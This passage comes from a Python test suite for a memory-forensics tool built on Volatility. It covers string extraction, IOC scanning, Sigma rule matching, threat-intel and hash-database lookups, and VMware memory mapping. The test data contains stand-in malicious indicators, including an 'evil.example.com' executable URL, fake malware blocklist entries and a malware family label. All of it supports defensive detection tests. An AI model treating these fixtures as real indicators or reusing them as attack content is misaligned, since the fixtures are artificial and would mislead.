        need = {p for p, i in w.row_info.items() if i.get("state") in pr.NEEDS_RETRY}
        check("main window: Load results fills the plugin list from disk",
              set(w.rows) == {r["plugin"] for r in rows2}, sorted(w.rows))
        check("main window: retry button exactly on failed/timed out/skipped/not-run rows",
              {p for p, b in btns.items() if b is not None} == need and "windows.info.Info" not in need,
              sorted(need))
        cov = help_cover(w.monitor)
        check("main window: retry buttons have help", not cov["missing"] and not cov["invalid"], cov)
        w.retry_queue = [{"plugin": "windows.netscan.NetScan", "timeout": 418}]
        w._set_retry_button("windows.netscan.NetScan")
        b = w.monitor.plugins.itemWidget(w.rows["windows.netscan.NetScan"], 4)
        check("main window: a queued retry shows 'queued' and is disabled",
              b.text() == "queued" and not b.isEnabled())
        w.retry_queue = []
        w.close()
        w.deleteLater()
        app.processEvents()
        mw.save_settings = saved
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_v24_speed_and_fixes():
    """v2.4: single-pass strings, parallel line scanners, Vol2/TI lanes, Sigma bucketing,
    'database removed after download', long output paths, resume after a crashed dump batch."""
    import random
    import shutil
    import tempfile
    print("[v2.4 speed + fixes]")
    tmp = Path(tempfile.mkdtemp())
    old_home = os.environ.get("RAMBREAKER_HOME")
    try:
        # ---- strings: one pass == two passes (also across segment borders)
        from modules import pystrings
        rnd = random.Random(7)
        blob = bytearray()
        words = [b"http://evil.example.com/a.exe", b"C:\\Windows\\System32\\cmd.exe", b"mailto:bob@example.org",
                 "pass\u0000w\u0000o\u0000r\u0000d\u0000".encode("latin-1"), b"x" * 300]
        while len(blob) < 3 * 1024 * 1024:
            blob += bytes(rnd.randrange(0, 256) for _ in range(rnd.randrange(1, 40)))
            w = rnd.choice(words)
            blob += w if rnd.random() < 0.5 else w.decode("latin-1").encode("utf-16-le")
        img = tmp / "img.bin"
        img.write_bytes(bytes(blob))
        pystrings.extract_to_file(img, tmp / "a1.txt", unicode=False)
        pystrings.extract_to_file(img, tmp / "u1.txt", unicode=True)
        na, nu = pystrings.extract_both_to_files(img, tmp / "a2.txt", tmp / "u2.txt")
        check("strings: single pass ASCII output identical to the separate pass",
              (tmp / "a1.txt").read_bytes() == (tmp / "a2.txt").read_bytes())
        check("strings: single pass UTF-16 output identical to the separate pass",
              (tmp / "u1.txt").read_bytes() == (tmp / "u2.txt").read_bytes())
        check("strings: returned line counts are right",
              na == (tmp / "a2.txt").read_bytes().count(b"\n") and nu == (tmp / "u2.txt").read_bytes().count(b"\n")
              and na > 1000, (na, nu))
        parts_a, parts_u = [], []
        for st, en in ((0, 1_000_003), (1_000_003, 2_000_001), (2_000_001, len(blob))):
            pa, pu = pystrings._worker_both((str(img), st, en, 4, str(tmp / f"pa{st}"), str(tmp / f"pu{st}")))
            parts_a.append(Path(pa).read_bytes())
            parts_u.append(Path(pu).read_bytes())
        check("strings: segments scanned for both encodings join to the whole-file result",
              b"".join(parts_a) == (tmp / "a1.txt").read_bytes() and b"".join(parts_u) == (tmp / "u1.txt").read_bytes())

        # ---- IOC step: scanners in their own processes == the serial loop
        from modules import ioc_extractor as ie
        from modules.browser_history import BrowserHistoryScanner
        from modules.comms_scanner import CommsScanner
        lines = []
        for i in range(60000):
            lines.append(rnd.choice([
                f"https://www.example{i % 97}.com/path?q={i}", f"From: alice{i % 7}@example.org",
                "To: bob@example.net", f"Subject: invoice {i % 13}", "Date: Mon, 1 Jan 2024 10:00:00 +0000",
                f"10.{i % 200}.3.{i % 250}", "random text line that matches nothing at all",
                f"https://www.google.com/search?q=how+to+{i % 31}", "mailto:carol@example.com?subject=hi",
                "-----BEGIN RSA PRIVATE KEY-----", "A" * 64, f"C:\\Users\\u{i % 5}\\Downloads\\file{i % 11}.exe"]))
        sf = tmp / "strings_all.txt"
        sf.write_bytes(("\n".join(lines) + "\n").encode("utf-8"))
        lg = logging.getLogger("t24")
        res = {}
        old_min = ie.PARALLEL_SCAN_MIN_BYTES
        for mode in ("serial", "parallel"):
            if mode == "serial":
                os.environ["RAMBREAKER_SERIAL_SCAN"] = "1"
            else:
                os.environ.pop("RAMBREAKER_SERIAL_SCAN", None)
                ie.PARALLEL_SCAN_MIN_BYTES = 1
            bh, cs = BrowserHistoryScanner(lg), CommsScanner(lg)
            od = tmp / ("iocs_" + mode)
            counts = ie.IOCExtractor(lg).extract_from_file(sf, od, line_scanners=[bh, cs])
            files = {f.name: f.read_bytes() for f in sorted(od.rglob("*")) if f.is_file()
                     and f.name not in ("ioc_results.json", "ioc_summary.txt")}
            res[mode] = (counts, files, json.dumps(bh._compile_results(), sort_keys=True, default=str),
                         json.dumps(cs._compile_results(), sort_keys=True, default=str), cs._line_count)
        ie.PARALLEL_SCAN_MIN_BYTES = old_min
        os.environ.pop("RAMBREAKER_SERIAL_SCAN", None)
        check("ioc scan: parallel line scanners give the same IOC counts", res["serial"][0] == res["parallel"][0]
              and res["serial"][0].get("url_http", 0) > 50, res["parallel"][0])
        check("ioc scan: every output file identical (IOC lists, e-mail artefacts)",
              res["serial"][1] == res["parallel"][1] and len(res["serial"][1]) > 5,
              [k for k in res["serial"][1] if res["serial"][1].get(k) != res["parallel"][1].get(k)])
        check("ioc scan: browser-history state copied back from its worker", res["serial"][2] == res["parallel"][2]
              and "google" in res["parallel"][2])
        check("ioc scan: comms state + line count copied back from its worker",
              res["serial"][3] == res["parallel"][3] and res["serial"][4] == res["parallel"][4] > 50000)

        # ---- lanes
        import importlib
        xw = importlib.import_module("modules.extractor.windows") if False else None
        from modules import plugin_retry as pr
        xw = pr.ext_module("windows")
        ex = xw.Extractor.__new__(xw.Extractor)
        ex.speed = "normal"
        os.environ["RAMBREAKER_VOL2_LANES"] = "2"
        check("vol2 lanes: environment override", ex._vol2_lanes(str(img), 14) == 2)
        os.environ.pop("RAMBREAKER_VOL2_LANES")
        n = ex._vol2_lanes(str(img), 14)
        check("vol2 lanes: between 1 and 3, never more than the plugins", 1 <= n <= 3 and ex._vol2_lanes(str(img), 1) == 1, n)

        # ---- sigma bucketing keeps event order across log sources
        from modules import sigma_engine as se
        rd = tmp / "rules"
        rd.mkdir()
        (rd / "r1.yml").write_text(
            "title: any registry\nid: 1\nlevel: low\nlogsource:\n  category: registry_event\n  product: windows\n"
            "detection:\n  sel:\n    TargetObject|contains: 'Run'\n  condition: sel\n", encoding="utf-8")
        evs = [{"_product": "windows", "_category": "registry_set", "TargetObject": "HKLM\\Run\\a", "_pid": 1},
               {"_product": "windows", "_category": "process_creation", "Image": "x", "_pid": 2},
               {"_product": "windows", "_category": "registry_add", "TargetObject": "HKLM\\Run\\b", "_pid": 3},
               {"_product": "windows", "_category": "registry_set", "TargetObject": "HKLM\\Run\\c", "_pid": 4}]
        orig = se.build_events
        se.build_events = lambda od, os_type: evs
        try:
            r = se.run(tmp / "case_sig", "windows", rd, lg)
        finally:
            se.build_events = orig
        got = [m.get("_pid") for h in r["hits"] for m in h["matches"]]
        check("sigma: rule over several event groups matches in the original event order", got == [1, 3, 4], got)

        # ---- threat-intel database removed after download
        os.environ["RAMBREAKER_HOME"] = str(tmp)
        from modules import ti_sources as ts
        dl = tmp / "threat_intel_db" / "downloaded"
        dl.mkdir(parents=True)
        (dl / "_meta.json").write_text(json.dumps({"threatfox": {"fetched_epoch": 1.7e9, "entries": 5},
                                                   "urlhaus": {"fetched_epoch": 1.7e9, "entries": 5}}), encoding="utf-8")
        (dl / "urlhaus.csv").write_text("x", encoding="utf-8")
        st = {x["id"]: x for x in ts.status()}
        check("ti status: downloaded file that vanished -> removed (not 'not downloaded')",
              st["threatfox"]["removed"] and not st["threatfox"]["present"] and st["threatfox"]["removed_fetched"])
        check("ti status: present file / never-downloaded source are not 'removed'",
              not st["urlhaus"]["removed"] and not st["malwarebazaar"]["removed"] and st["urlhaus"]["present"])
        from modules import ti_report_js
        check("ti report: 'Missing after download' note exists", "removed_after_download" in ti_report_js.__dict__.get(
            "JS", "") or "removed_after_download" in Path(ti_report_js.__file__).read_text(encoding="utf-8"))

        # ---- a list file blocked by antivirus is skipped, not a crash
        tm = dl / "trails" / "malware"
        tm.mkdir(parents=True)
        (tm / "good.txt").write_text("evil.example.com\n", encoding="utf-8")
        (tm / "blocked.txt").write_text("bad.example.net\n", encoding="utf-8")
        real_rt = Path.read_text

        def fake_rt(self, *a, **k):
            if self.name == "blocked.txt":
                raise OSError(22, "Invalid argument")
            return real_rt(self, *a, **k)
        Path.read_text = fake_rt
        try:
            got_tr = [v for _k, v, _l, _w in ts.iter_source(ts.BY_ID["maltrail"])]
        finally:
            Path.read_text = real_rt
        check("ti feeds: unreadable list file is skipped and remembered",
              got_tr == ["evil.example.com"] and ts.UNREADABLE.get("maltrail") == ["blocked.txt"],
              (got_tr, ts.UNREADABLE.get("maltrail")))
        from modules import volatility as vmod
        check("plugin exit reason: start failure and crash codes are explained",
              "could not start" in vmod.exit_reason(3221225794) and "access violation" in vmod.exit_reason(-1073741819)
              and vmod.exit_reason(1).startswith("exit 1"))
        from modules import threat_intel as ti_mod
        check("ti: memory-acquisition tools are recognised by file name only",
              ti_mod.acquisition_tool("\\Users\\a\\Desktop\\DumpIt.exe") == "DumpIt"
              and ti_mod.acquisition_tool("winpmem_mini_x64.exe") == "WinPmem"
              and ti_mod.acquisition_tool("notepad.exe") == "" and ti_mod.acquisition_tool("procdump.exe") == "")

        # ---- long output paths (Vol3 cli fix) + staged fix order
        from modules.installer import VolatilityInstaller
        fixes = [f for f in VolatilityInstaller._FRAMEWORK_FIXES if f[0] == "cli/__init__.py"
                 and "RAMBREAKER_SAFE_ZIP" not in f[2]]          # v2.5 output hook: test_safe_zip
        check("vol3 fix table: name sanitiser + path-length fix both present, in that order",
              len(fixes) == 2 and fixes[0][2].count("[:200]") == 1 and "_rb_room" in fixes[1][2]
              and fixes[1][1] in fixes[0][2])
        ns = {}
        code = ("import os\ndef final(output_dir, preferred):\n"
                "    if True:\n        if True:\n            if True:\n"
                + fixes[0][2].replace("self.preferred_filename", "preferred")
                .replace(fixes[1][1], fixes[1][2])
                + "                return output_filename\n")
        exec(code, ns)
        deep = "C:\\" + "\\".join(["d" * 40] * 4)
        long_name = "file.0x7da3ddd0.0xfa8003c3d840.DataSectionObject." + "m" * 150 + ".manifest.dat"
        outp = ns["final"](deep, long_name)
        check("vol3 fix: over-long output path is shortened under 260 characters",
              (len(outp) < 255 or os.name != "nt") and os.path.basename(outp).startswith(
                  "file.0x7da3ddd0.0xfa8003c3d840.DataSectionObject.") and outp.endswith(".dat"), (len(outp), outp[-60:]))
        check("vol3 fix: two different long names stay different",
              ns["final"](deep, long_name) != ns["final"](deep, long_name.replace(".manifest", ".manifesu")))
        check("vol3 fix: short names are untouched", os.path.basename(ns["final"]("C:\\o", "pid.4.exe")) == "pid.4.exe")

        # ---- resume after a crashed dump batch
        from modules import extract_jobs as xj
        job = xj.Job.__new__(xj.Job)
        job.log = lg
        stg = tmp / "stg"
        stg.mkdir()
        items = [{"offset": hex(0x1000 * (k + 1)), "name": f"f{k}"} for k in range(8)]
        calls = []

        def fake_run(argv, key, n=1, floor=300, cwd=None):
            offs = [a for a in argv if a.startswith("0x")]
            calls.append(offs)
            for o in offs:                               # 0x5000 raises again, the rest dump fine
                if o == "0x5000":
                    return 1, "", "FileNotFoundError: x 'file.0x5000.0xfa.DataSectionObject.y.dat'", 1.0, False
                (stg / f"file.{o}.0xfa.DataSectionObject.n.dat").write_bytes(b"d")
            return 0, "", "", 1.0, False
        job.run = fake_run
        job.v3 = lambda out=None, json_out=False: ["vol"]
        for o in ("0x1000", "0x2000"):                   # first run: 2 outputs, then crash on the 3rd object
            (stg / f"file.{o}.0xfa.DataSectionObject.n.dat").write_bytes(b"d")
        culprit = {}
        left = job._resume_after_crash(list(range(8)), items, "--physaddr", stg,
                                       "OSError: boom 'file.0x3000.0xfa.DataSectionObject.z.dat'", culprit)
        have = sorted(f.name.split(".")[1] for f in stg.iterdir())
        check("dump resume: objects after the crash are dumped, both failing objects named",
              have == ["0x1000", "0x2000", "0x4000", "0x6000", "0x7000", "0x8000"] and sorted(culprit) == [2, 4]
              and left == "", (have, culprit, left))
        check("dump resume: each re-run starts after the object that failed",
              calls == [["0x4000", "0x5000", "0x6000", "0x7000", "0x8000"], ["0x6000", "0x7000", "0x8000"]], calls)
    finally:
        os.environ.pop("RAMBREAKER_SERIAL_SCAN", None)
        os.environ.pop("RAMBREAKER_VOL2_LANES", None)
        if old_home is None:
            os.environ.pop("RAMBREAKER_HOME", None)
        else:
            os.environ["RAMBREAKER_HOME"] = old_home
        shutil.rmtree(tmp, ignore_errors=True)


def test_v24_local_hash_databases():
    """v2.4 optional local hash databases: MalwareBazaar full set, VirusShare, NIST NSRL."""
    import shutil
    import sqlite3
    import tempfile
    print("[v2.4 local hash databases]")
    tmp = Path(tempfile.mkdtemp())
    old_home = os.environ.get("RAMBREAKER_HOME")
    os.environ["RAMBREAKER_HOME"] = str(tmp)
    try:
        from modules import ti_sources as ts
        dl = tmp / "threat_intel_db" / "downloaded"
        dl.mkdir(parents=True)
        opt = {x["id"]: x for x in ts.status() if x["optional"]}
        check("hash dbs: four optional sources, none present, none counted as removed",
              sorted(opt) == ["malwarebazaar_full", "nsrl_delta", "nsrl_full", "virusshare"]
              and not any(x["present"] or x["removed"] for x in opt.values())
              and all(x["size"] for x in opt.values()), sorted(opt))
        a, b, c = "aa" * 32, "bb" * 20, "cc" * 16
        # ---- MalwareBazaar full database
        con = sqlite3.connect(str(dl / "malwarebazaar_full.sqlite"))
        con.execute("CREATE TABLE h(sha256 BLOB PRIMARY KEY, md5 BLOB, sha1 BLOB, sig TEXT, ftype TEXT, first TEXT) WITHOUT ROWID")
        con.execute("INSERT INTO h VALUES (?,?,?,?,?,?)", (bytes.fromhex(a), bytes.fromhex(c), bytes.fromhex(b),
                                                           "AgentTesla", "exe", "2020-02-13 11:55:46"))
        con.execute("CREATE INDEX h_md5 ON h(md5)")
        con.execute("CREATE INDEX h_sha1 ON h(sha1)")
        con.commit()
        con.close()
        # ---- VirusShare table
        v1 = "12" * 16
        con = sqlite3.connect(str(dl / "virusshare_md5.sqlite"))
        con.execute("CREATE TABLE v(md5 BLOB PRIMARY KEY) WITHOUT ROWID")
        con.execute("INSERT INTO v VALUES (?)", (bytes.fromhex(v1),))
        con.commit()
        con.close()
        (dl / "_meta.json").write_text(json.dumps({
            "malwarebazaar_full": {"fetched_epoch": 1.7e9, "entries": 1},
            "virusshare": {"fetched_epoch": 1.7e9, "entries": 1, "parts": 1}}), encoding="utf-8")
        ind = {"ip": {}, "domain": {}, "url": {}, "sha256": {a: {}, "00" * 32: {}}, "sha1": {b: {}},
               "md5": {c: {}, v1: {}, "34" * 16: {}}}
        hits, used = ts.match(ind)
        got = sorted((h["source"], h["kind"], h["value"]) for h in hits)
        check("hash dbs: MalwareBazaar matches by SHA-256, SHA-1 and MD5; VirusShare by MD5; unknown hashes do not",
              got == sorted([("malwarebazaar_full", "sha256", a), ("malwarebazaar_full", "sha1", b),
                             ("malwarebazaar_full", "md5", c), ("virusshare", "md5", v1)]), got)
        lab = next(h["label"] for h in hits if h["kind"] == "sha256")
        check("hash dbs: a MalwareBazaar hit carries family, type and first-seen date",
              "AgentTesla" in lab and "exe" in lab and "2020-02-13" in lab and all(h["weight"] == 3 for h in hits), lab)
        check("hash dbs: both databases are listed as used with their entry counts",
              {u["id"]: u["entries"] for u in used} == {"malwarebazaar_full": 1, "virusshare": 1}, used)
        # ---- NSRL: delta (.sql text) and full set (SQLite FILE table) end in the same table
        h1, h2 = "AB" * 32, "CD" * 32
        sql = ["BEGIN TRANSACTION;",
               f"INSERT INTO FILE(sha256,sha1,md5,crc32,file_name,file_size,package_id) VALUES('{h1}','{'EF' * 20}','{'01' * 16}','E36B977B','a.dll',1564,7056);",
               "INSERT INTO MFG(manufacturer_id,name) VALUES(1,'x');", "COMMIT;"]
        con = ts._nsrl_open(dl / "nsrl_known.sqlite")
        n1 = ts.nsrl_import_sql(sql, con)
        rds = tmp / "rds.db"
        rc = sqlite3.connect(str(rds))
        rc.execute("CREATE TABLE FILE (sha256 VARCHAR, sha1 VARCHAR, md5 VARCHAR, crc32 VARCHAR, file_name VARCHAR, "
                   "file_size INTEGER, package_id INTEGER)")
        for pk in (1, 2):                                   # the same file in two packages = one hash row
            rc.execute("INSERT INTO FILE VALUES (?,?,?,?,?,?,?)", (h2, "12" * 20, "23" * 16, "0", "b.exe", 5, pk))
        rc.commit()
        rc.close()
        n2 = ts.nsrl_import_db(rds, con)
        total = con.execute("SELECT COUNT(*) FROM g").fetchone()[0]
        con.execute("CREATE INDEX IF NOT EXISTS g_sha1 ON g(sha1)")
        con.execute("CREATE INDEX IF NOT EXISTS g_md5 ON g(md5)")
        con.commit()
        con.close()
        check("nsrl: delta .sql rows and full-set .db rows are imported, duplicates collapse",
              (n1, n2, total) == (1, 1, 2), (n1, n2, total))
        check("nsrl: known-file lookup by SHA-256 / SHA-1 / MD5, unknown hash not found",
              ts.known_file_lookup("sha256", [h1.lower(), h2.lower(), "00" * 32]) == {h1.lower(), h2.lower()}
              and ts.known_file_lookup("sha1", ["12" * 20]) == {"12" * 20}
              and ts.known_file_lookup("md5", ["01" * 16, "99" * 16]) == {"01" * 16})
        st = {x["id"]: x for x in ts.status()}
        check("nsrl: the shared database file alone does not mark either NSRL row as installed",
              not st["nsrl_delta"]["present"] and not st["nsrl_full"]["present"])
        check("nsrl: it is not a threat feed (never produces feed hits)",
              not [h for h in ts.match({"ip": {}, "domain": {}, "url": {}, "sha256": {h1.lower(): {}},
                                        "sha1": {}, "md5": {}})[0]])
        page = ('<a href="https://s3.amazonaws.com/rds.nsrl.nist.gov/RDS/rds_2026.03.1/RDS_2026.03.1_modern_minimal.zip">x</a>'
                '<a href="https://s3.amazonaws.com/rds.nsrl.nist.gov/RDS/rds_2025.03.1/RDS_2025.03.1_modern_minimal.zip">y</a>'
                '<a href="https://s3.amazonaws.com/rds.nsrl.nist.gov/RDS/rds_2026.09.1/RDS_2026.09.1_modern_minimal_delta.zip">z</a>'
                '<a href="https://s3.amazonaws.com/rds.nsrl.nist.gov/RDS/rds_2026.06.1/RDS_2026.06.1_modern_minimal_delta.zip">w</a>')
        check("nsrl: newest full set and newest delta are picked from the NIST page",
              ts.nsrl_latest("modern_minimal", page)[1] == "2026.03.1"
              and ts.nsrl_latest("modern_minimal_delta", page) ==
              ("https://s3.amazonaws.com/rds.nsrl.nist.gov/RDS/rds_2026.09.1/RDS_2026.09.1_modern_minimal_delta.zip", "2026.09.1"))
        os.environ["RAMBREAKER_TI_MAX_PARTS"] = "3"
        check("hash dbs: RAMBREAKER_TI_MAX_PARTS limits a multi-file install (test switch)", ts._max_parts() == 3)
        os.environ.pop("RAMBREAKER_TI_MAX_PARTS")
        check("hash dbs: no limit by default", ts._max_parts() == 0)
    finally:
        os.environ.pop("RAMBREAKER_TI_MAX_PARTS", None)
        if old_home is None:
            os.environ.pop("RAMBREAKER_HOME", None)
        else:
            os.environ["RAMBREAKER_HOME"] = old_home
        shutil.rmtree(tmp, ignore_errors=True)


def test_vmem_gap():
    """VMware .vmem without .vmss/.vmsn: RAM above the PCI hole found from the
    guest page tables (modules/vmem_gap.py), applied by the Vol3 layer and the
    Vol2 address space; Vol2 imageinfo skipped for builds newer than its profiles."""
    import importlib.util
    import shutil
    import struct
    import tempfile
    print("[VMware .vmem memory map]")
    from modules import vmem_gap as vg
    from modules import platform_compat as pc
    tmp = Path(tempfile.mkdtemp())
    saved = (vg.GB4, os.environ.get("RB_VMEM_MAP_DIR"))
    MB = vg.MB
    try:
        # scaled-down guest: hole ends at 64 MB, file 64 MB, low RAM 48 MB,
        # the last 16 MB of the file are guest RAM 64-80 MB
        vg.GB4 = 64 * MB
        size, split = 64 * MB, 48 * MB

        def f_of(p):
            return p if p < split else p - vg.GB4 + split

        def build(path, gap):
            img = bytearray(size)
            nxt = {"lo": 1 * MB, "hi": vg.GB4 + 1 * MB}

            def page(where):
                where = where if gap else "lo"
                p = nxt[where]
                nxt[where] += 0x1000
                if where == "lo" and nxt["lo"] >= (split if gap else size) - MB:
                    raise AssertionError("test image too small")
                return p

            def put(p, idx, val):
                o = (f_of(p) if gap else p) + idx * 8
                struct.pack_into("<Q", img, o, val)

            for r in range(8):                                # 8 processes
                pml4 = page("hi" if r % 2 else "lo")
                put(pml4, 0x1ED, pml4 | 0x8000000000000063)  # Windows self-reference
                for k, idx in enumerate((0, 1, 2, 0x100, 0x101, 0x180)):
                    pdpt = page("hi" if (k + r) % 2 else "lo")
                    put(pml4, idx, pdpt | 0x63)
                    for e in range(20):                       # non-leaf PDPT entries
                        pd = page("hi" if e % 3 == 0 else "lo")
                        put(pdpt, e, pd | 0x63)
            path.write_bytes(bytes(img))

        gap_img = tmp / "guest_nometa.vmem"
        build(gap_img, True)
        m = vg.solve(str(gap_img))
        check("vmem map: split found from the page tables (48 MB of 64 MB)",
              m.get("remap") and m.get("split") == split
              and m["segments"] == [[0, 0, split], [vg.GB4, split, size - split]],
              {k: m.get(k) for k in ("remap", "split", "consistent", "evidence", "reason")})
        flat = tmp / "flat.vmem"
        build(flat, False)
        m2 = vg.solve(str(flat))
        check("vmem map: dump without a hole is left alone", m2.get("remap") is False,
              {k: m2.get(k) for k in ("remap", "split", "reason")})
        zero = tmp / "zero.vmem"
        zero.write_bytes(bytes(8 * MB))
        m3 = vg.solve(str(zero))
        check("vmem map: no page tables -> no remap", m3.get("remap") is False, m3.get("reason"))

        # sidecar detection
        check("vmem map: .vmem without .vmss/.vmsn detected",
              vg.is_vmem_without_metadata(str(gap_img)))
        (tmp / "guest_nometa.vmsn").write_bytes(b"x")
        check("vmem map: .vmsn beside it -> VMware metadata used instead",
              not vg.is_vmem_without_metadata(str(gap_img)))
        (tmp / "guest_nometa.vmsn").unlink()
        check("vmem map: other extensions are not treated as .vmem",
              not vg.is_vmem_without_metadata(str(tmp / "x.raw")))

        # cached map -> Vol3 layer reads the same segments
        maps = tmp / "maps"
        os.environ["RB_VMEM_MAP_DIR"] = str(maps)
        got = vg.ensure_map(str(gap_img), maps)
        check("vmem map: cached as JSON (second call reads the cache)",
              vg.map_file(str(gap_img), maps).is_file()
              and vg.ensure_map(str(gap_img), maps) == got)
        lay_src = Path(__file__).resolve().parent.parent / "vol_layers" / "rb_vmem_gap.py"
        try:
            spec = importlib.util.spec_from_file_location("rb_vmem_gap_layer", str(lay_src))
            lay = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(lay)
            segs = lay.load_segments(gap_img.as_uri())
            check("vmem map: Vol3 layer loads the map for the file URL",
                  segs == [(0, 0, split), (vg.GB4, split, size - split)], segs)
            check("vmem map: Vol3 layer ignores files without a map",
                  lay.load_segments(flat.as_uri()) is None)
            check("vmem map: Vol3 stacker runs after VMware (20), before Linux/Windows (35/40)",
                  20 < lay.RBVmemGapStacker.stack_order < 35)
        except ImportError as exc:
            check("vmem map: Vol3 layer importable", False, exc)
        # the three copies of the key must agree
        src = Path(__file__).resolve().parent.parent
        key_line = '"%s|%d|%d" % (os.path.basename('
        check("vmem map: same map key in tool, Vol3 layer and Vol2 address space",
              all(key_line in p.read_text(encoding="utf-8") for p in
                  (src / "modules" / "vmem_gap.py", lay_src,
                   src / "vol2_addrspaces" / "rb_vmem_gap.py")))
        check("vmem map: Vol2 gets the RAMBreaker address-space folder",
              any(str(pc.vol2_addrspace_dir()) in a for a in pc.vol2_global_args()),
              pc.vol2_global_args())

        # Vol2 imageinfo: skipped only for builds newer than its newest profile
        from modules.volatility import VolatilityWrapper
        vw = VolatilityWrapper(logging.getLogger("t_vmem"))
        vw.vol2_cmd = "python vol.py"
        vw.__dict__["_vol2_newest_build"] = 19041
        calls = []
        vw._detect_profile_vol2 = lambda image: calls.append(image) or False
        res = {}
        for b in (7601, 19045, 20348, 22621):
            calls.clear()
            vw.profile = None
            vw._maybe_vol2_profile("img", "Major/Minor\t15.%d\n" % b)
            res[b] = bool(calls)
        check("vol2 imageinfo: run for 7601/19045, skipped for 20348 (Server 2022) and 22621",
              res == {7601: True, 19045: True, 20348: False, 22621: False}, res)
    finally:
        vg.GB4 = saved[0]
        if saved[1] is None:
            os.environ.pop("RB_VMEM_MAP_DIR", None)
        else:
            os.environ["RB_VMEM_MAP_DIR"] = saved[1]
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    # check names contain non-cp1252 characters; a redirected stdout must not fail a test
    for _st in (sys.stdout, sys.stderr):
        try:
            _st.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    for t in (test_extraction_v2, test_corroborate_processes, test_classify_failure,
              test_assess_fixtures, test_advisory_nonempty, test_ioc_extractor,
              test_crash_report, test_vol3_demotion, test_telemetry,
              test_comms_scanner, test_html_report_xss, test_download_integrity,
              test_symbol_zip_integrity, test_vad_injection,
              test_injection_correlator, test_btf2isf,
              test_btf2isf_resolver_glue, test_timeline_linux_file_events,
              test_timeout_model_formats, test_ioc_check_attribution_state,
              test_gui_fast_sort, test_linux_elfs_labels, test_linux_malfind_skip_fix,
              test_vol2_resume_clean_empty, test_gui_extract_job_done, test_gui_mode_split,
              test_gui_wheel_guard, test_threat_intel, test_gui_threat_intel, test_safe_zip, test_dependency_gate, test_plugin_retry,
              test_v24_speed_and_fixes, test_v24_local_hash_databases,
              test_vmem_gap):
        try:
            t()
        except Exception as exc:  # a crashing test is a failing test
            global _FAIL
            _FAIL += 1
            print(f"  FAIL  {t.__name__} raised {type(exc).__name__}: {exc}")
    print("-" * 50)
    print(f"RESULT: {_PASS} passed, {_FAIL} failed")
    return 1 if _FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
